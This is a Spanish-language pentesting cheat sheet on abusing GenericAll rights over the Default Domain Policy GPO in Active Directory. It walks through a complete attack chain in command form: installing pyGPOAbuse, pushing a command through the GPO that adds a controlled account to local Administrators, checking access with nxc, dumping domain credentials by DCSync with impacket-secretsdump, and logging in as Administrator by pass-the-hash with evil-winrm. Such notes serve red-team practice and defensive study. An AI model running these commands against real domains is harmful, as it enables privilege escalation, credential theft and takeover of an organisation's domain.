# Abuso ACL 

Tags: #AD #ACL #Linux #DCSync 

## GenericAll sobre GPO Defalut Domain Policy 

Si tenemos esta ACL sobre un **GPO**, tenemos control total sobre el GPO y podemos **modificar su configuración**, pudiendo utilizarlo para ejecutar acciones/comandos mediante Group Policy.

El icono en BloodHound, la **GPO (Group Policy Object)** aparece representada con el **icono de una lista/documento** color azul.

* [GPOAbuse](https://github.com/Hackndo/pyGPOAbuse)

En BloodHound se puede ver el identificador de la GPO a la cual se tiene privilegios.
- ``Distinguished Name : CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=Domain,DC=local``

```bash 
# Clonar el repositorio e instalarlo en un entorno virtual 
❯ python3 -m venv gpoabuse_env && source gpoabuse_env/bin/activate && git clone https://github.com/Hackndo/pyGPOAbuse.git && cd pyGPOAbuse && pip3 install -r requirements.txt 
```

```bash 
❯ python3 pygpoabuse.py -h   # Panel de ayuda 

Paso 1:
# Abusar de una GPO sobre la que el usuario tiene permisos de modificación, agregando un comando que se ejecutará cuando la GPO se aplique.
❯ python3 pygpoabuse.py <DOMAIN>/<USER>:'<PASS>' -gpo-id <GPO-GUID> -command 'net localgroup Administrators <ControlledAccount> /add' -dc-ip IP_DC -f

	# GPO-GUID = 6AC1786C-016F-11D2-945F-00C04FB984F9
	# command = Asignar al usuario ControlledAccount cuenta privilegiada 
	# f = Forzar una tarea programada de forma privilegiada 

Paso 2:
# Verificar si el usuario controlado es administrador por SMB 
❯ nxc smb IP_DC -u user -p 'P@$$w0rd123!' 


NOTA: 
	- El cambio no es instantaneo, se debe esperar unos minutos 
	- Pero si tarda mucho, volver a ejecutar el comando varias veces 
```

```bash 
Paso 3:
# Ejecutar un DCSync 
❯ impacket-secretsdump 'domain.local/user:P@$$w0rd123!'@IP-DC 

Paso 4:
# Hacer un PtH con el hash NTLM del Administrador 
❯ evil-winrm -i IP_DC -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```